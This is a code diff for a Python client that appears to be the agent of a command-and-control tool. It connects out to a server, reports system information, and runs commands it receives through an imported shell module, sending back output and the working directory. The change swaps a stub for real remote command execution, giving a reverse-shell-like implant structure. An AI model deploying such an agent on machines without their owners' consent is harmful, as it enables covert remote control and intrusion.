@@ -1,9 +1,11 @@
 import os
 import sys
 import socket
-import json
 import time
 from data import get_system_info
+from shell import run_command
+from helper import send_json, receive_json
+
 
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = int(sys.argv[2])
@@ -24,10 +26,8 @@ def read_uuid() -> str | None:
 
     return None
 
-def run_command(command: str) -> tuple[str, str]:
-    return "helllo", "/"
-
 def communicate(s: socket.socket, initial_connection_info: dict) -> None:
+
     while True:
         # Read agent_id
         agent_id = read_uuid()
@@ -35,11 +35,10 @@ def communicate(s: socket.socket, initial_connection_info: dict) -> None:
             initial_connection_info["agent_id"] = agent_id
 
         # Send system info
-        raw_data = json.dumps(initial_connection_info)
-        s.send(raw_data.encode())
+        send_json(s, initial_connection_info)
 
         # Receive
-        agent_uid = json.loads(s.recv(BUFFER_SIZE).decode().strip())
+        agent_uid = receive_json(s)
 
         # Save to file received agent_id
         with open(AGENT_ID_FILENAME, "w") as f:
@@ -47,32 +46,31 @@ def communicate(s: socket.socket, initial_connection_info: dict) -> None:
 
         while True:
             try:
-                message = s.recv(BUFFER_SIZE).decode()
-                if not message:
+                message = receive_json(s)
+                if message is None:
                     print("Server disconnected.")
                     s.close()
                     main()
 
-                json_message = json.loads(message)
-
-                response_tuple = run_command(json_message["command"])
+                print(f"Received message: {message}")
+                response_tuple = run_command(message["command"])
                 response = {
                     "type": "command_response",
-                    "command_id": json_message["command_id"],
+                    "command_id": message["command_id"],
                     "command_response": response_tuple[0],
                     "cwd":  response_tuple[1],
                 }
-                s.send(json.dumps(response).encode())
+                send_json(s, response)
 
             except socket.timeout:  # If socket timeout, send heartbeat
                 message = {
                     "type": "heartbeat",
                 }
-                s.send(json.dumps(message).encode())
-                print("Sent heartbeat")
+                send_json(s, message)
+                print("Heartbeat sent.")
 
-            except Exception:
-                print("Server disconnected.")
+            except Exception as e:
+                print(e)
                 s.close()
                 main()
 
